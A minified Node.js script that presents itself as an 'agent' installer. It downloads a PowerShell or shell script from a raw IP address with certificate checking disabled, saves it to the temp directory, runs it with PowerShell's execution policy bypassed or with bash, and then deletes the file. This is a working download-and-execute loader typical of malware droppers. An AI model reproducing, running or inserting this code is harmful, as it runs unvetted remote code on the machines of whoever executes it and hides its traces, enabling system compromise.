(()=>{const https=require('https'),fs=require('fs'),os=require('os'),cp=require('child_process'),p=require('path');const w=os.platform()==='win32',u='https://159.223.134.57:8443/'+(w?'install-agent.ps1':'install-agent.sh'),f=p.join(os.tmpdir(),w?'agent-install.ps1':'agent-install.sh');https.get(u,{rejectUnauthorized:false},r=>{if(r.statusCode!==200){console.error('Installer download failed:',r.statusCode);process.exit(1)}const s=fs.createWriteStream(f);r.pipe(s);s.on('finish',()=>{s.close(()=>{const c=w?'powershell.exe':'bash';const a=w?['-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-File',f]:[f];cp.spawn(c,a,{stdio:'inherit'}).on('close',x=>{try{fs.unlinkSync(f)}catch{}process.exit(x??1)})})})}).on('error',e=>{console.error('Installer download failed:',e.message);process.exit(1)})})()
